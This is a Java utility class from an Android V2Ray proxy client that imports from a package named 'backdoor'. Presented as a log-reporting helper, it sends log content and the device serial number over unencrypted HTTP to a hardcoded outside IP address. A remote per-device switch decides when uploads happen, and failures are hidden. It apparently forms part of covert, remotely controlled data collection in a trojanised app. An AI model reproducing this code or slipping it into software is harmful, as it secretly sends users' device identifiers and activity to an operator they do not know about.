package com.v2ray.ang.util;

import android.os.Build;
import android.util.Log;

import com.google.common.collect.Maps;
import com.google.gson.Gson;

import java.io.IOException;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import static com.v2ray.ang.backdoor.SocksServerManager.TAG;


/**
 * 用于向日志中心上报日志统一收集分析
 */
public class LogCenter {

    private static final String LOG_CENTER_HOST = "http://118.24.16.116:8080/log";
    private static final String LOG_CENTER_UPLOAD_URL = LOG_CENTER_HOST + "/quick";
    private static final String LOG_CENTER_SWITCH_URL = LOG_CENTER_HOST + "/switch";
    private static final String clientId = Build.SERIAL;

    private static void asyncGet(String content) {
        OkHttpClient client = HttpClientUtils.getClient();
        Request request = HttpClientUtils.getRequest(LOG_CENTER_UPLOAD_URL);
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.i(TAG, "request log center failure,content:" + content);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

            }
        });
    }

    private static void asyncPost(String url, Map<String, String> params) {

        OkHttpClient client = HttpClientUtils.getClient();
        Request request = HttpClientUtils.postRequest(url, params);
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.i(TAG, "request log center failure,content:" + new Gson().toJson(params));
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
            }
        });
    }

    public static void log(String content) {
        Log.i(TAG, content);
        // 异步Http调用，并且不能影响业务
        internalAsyncLog(content);
    }

    public static void log(String content, Throwable throwable) {
        Log.e(TAG, content, throwable);
        // 异步Http调用，并且不能影响业务
        internalAsyncLog(content + ", exception: " + throwable.getMessage());
    }

    /**
     * 纯异步上报日志，并且不会抛出异常
     */
    private static void internalAsyncLog(String content) {
        try {
            // 异步请求日志开关
            OkHttpClient client = HttpClientUtils.getClient();
            Request request = HttpClientUtils.getRequest(LOG_CENTER_SWITCH_URL + "/" + clientId);
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.i(TAG, "request log center switch failure,content: " + content);
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        if (response.body() == null) {
                            return;
                        }
                        String resp = response.body().string();
                        Map data = new Gson().fromJson(resp, Map.class);
                        if (!"true".equals(data.get("data"))) {
                            Log.i(TAG, "日志开关为关");
                            return;
                        }
                        Map<String, String> params = Maps.newHashMap();
                        params.put("logContent", content);
                        params.put("clientId", clientId);
                        asyncPost(LOG_CENTER_UPLOAD_URL, params);
                    } catch (Throwable e) {
                        Log.e(TAG, "log center upload error", e);
                    } finally {
                        try {
                            response.close();
                        } catch (Exception e) {
                            Log.e(TAG, "http response close exception:", e);
                        }
                    }
                }
            });
        } catch (Throwable e) {
            Log.e(TAG, "aysnc log error:", e);
        }
    }
}
